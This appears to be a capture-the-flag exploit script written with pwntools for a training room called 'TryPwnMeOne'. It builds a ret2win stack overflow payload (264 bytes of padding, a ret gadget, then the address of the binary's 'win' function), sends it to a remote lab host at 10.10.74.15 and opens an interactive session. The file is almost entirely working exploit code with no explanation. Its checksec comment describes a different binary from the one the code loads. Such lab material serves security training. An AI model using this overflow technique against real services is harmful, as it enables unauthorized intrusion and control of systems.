import pwn
from pwn import context, remote, process, p32, p64, asm, shellcraft, ROP

# checksec --file materials-TryPwnMeOne/TryOverFlowMe1/overflowme1 
#[*] 'pwntools/trypwnme/materials-TryPwnMeOne/TryOverFlowMe1/overflowme1'
#   Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX unknown - GNU_STACK missing
#     PIE:        No PIE (0x400000)
#     Stack:      Executable
#     RWX:        Has RWX segments
#     Stripped:   No

# execute shellcode

context.binary = binary = 'materials-TryPwnMeOne/TryRetMe/tryretme'

rop = ROP(binary)
ret = rop.find_gadget(["ret"])[0]

elf = pwn.ELF(binary)
addr_win = elf.symbols['win']

payload = (b'A' * 264)
payload += p64(ret)
payload += p64(addr_win)

#p = process()
p = remote("10.10.74.15", 9006)
p.recv()
p.sendline(payload)
p.interactive()
